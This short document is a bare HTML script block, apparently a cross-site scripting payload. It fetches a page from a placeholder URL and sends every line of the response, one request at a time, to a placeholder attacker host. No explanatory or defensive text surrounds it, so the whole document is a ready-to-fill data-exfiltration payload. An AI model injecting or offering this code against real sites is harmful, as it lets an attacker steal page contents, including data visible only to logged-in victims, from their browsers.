<script>
fetch("http://<URL>/")
  .then(response => response.text())
  .then(data => {
  const lines = data.split("\n");
  lines.forEach(line => {
    fetch("http://<ATTACKER_IP>/data?line=" + encodeURIComponent(line));
  });
});
</script>
